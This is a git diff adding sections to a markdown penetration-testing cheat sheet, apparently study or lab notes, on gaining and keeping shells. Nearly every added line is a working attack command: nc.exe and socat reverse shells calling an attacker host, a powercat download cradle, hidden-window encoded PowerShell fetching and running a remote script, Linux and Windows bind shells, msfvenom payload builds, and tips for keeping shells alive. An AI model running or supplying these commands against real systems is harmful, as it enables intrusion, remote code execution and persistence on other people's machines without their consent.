@@ -72,3 +72,60 @@ msfvenom -p php/reverse_php LHOST=<KALI> LPORT=443 -f raw -o shell.php
 ```
 - PHP output: strip the leading comment, add `<?php`.
 - Non-staged (`shell_reverse_tcp`) → plain `nc` listener works.
+
+## Windows reverse shells without PowerShell one-liners
+Upload `nc.exe` ([file-transfer](file-transfer.md)):
+```cmd
+C:\Temp\nc.exe <KALI> 443 -e cmd.exe
+```
+`powercat` from memory (serve `powercat.ps1` on :8000):
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://<KALI>:8000/powercat.ps1'); powercat -c <KALI> -p 443 -e cmd
+```
+- `-e cmd` drops to `cmd.exe`; add `-ep` for PowerShell, `-l -p 4444 -e cmd` for a bind listener.
+
+## PowerShell `-EncodedCommand`
+Avoids quoting problems in web shells, `xp_cmdshell`, and command injection. Needs UTF-16LE then Base64:
+
+```bash
+printf '%s' "IEX(New-Object Net.WebClient).DownloadString('http://<KALI>:8000/rev.ps1')" \
+  | iconv -f UTF-8 -t UTF-16LE | base64 -w0
+```
+```cmd
+powershell -nop -w hidden -enc <BASE64>
+```
+- Total command line is limited (about 8191 characters through `cmd.exe`): keep the inner command a download cradle, not a whole shell.
+- Same encoding feeds the VBA macro chunker ([client-side](client-side-phishing.md#office-vba-document)).
+- `rev.ps1` = the PowerShell one-liner above saved as a file.
+
+## Bind shell (outbound traffic blocked)
+Target listens, Kali connects. Open the port first (`ss -lntp` / `netstat -ano`); a host firewall can still block it.
+
+```bash
+# Linux target
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f
+```
+```cmd
+:: Windows target
+C:\Temp\nc.exe -lvnp 4444 -e cmd.exe
+```
+```bash
+nc <IP> 4444                               # Kali
+msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf
+msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind.exe
+```
+- No reverse callback on 443/80/53 either: look for a bind on an allowed inbound port, or tunnel through an existing service ([pivoting](../06-pivoting.md)).
+
+## Fully interactive Linux shell with socat
+```bash
+# Kali
+socat file:`tty`,raw,echo=0 tcp-listen:443
+# target (needs socat; upload a static binary if missing)
+socat tcp:<KALI>:443 exec:'bash -li',pty,stderr,setsid,sigint,sane
+```
+- Gives job control and tab completion without `stty` steps.
+
+## Shell hangs or dies
+- Web-triggered shell killed with the request: start it detached, `nohup bash -c '<REVERSE-SHELL>' >/dev/null 2>&1 &` or `setsid`, and return a quick response.
+- Windows service shell dies on logoff or timeout: migrate to a second shell via a scheduled task or a fresh `nc.exe` callback.
+- A command waits for input forever (`sudo`, `mysql`, `passwd`): `Ctrl+C` kills the shell on a non-TTY. [Upgrade to a TTY](#stabilize-a-linux-tty) before interactive tools.
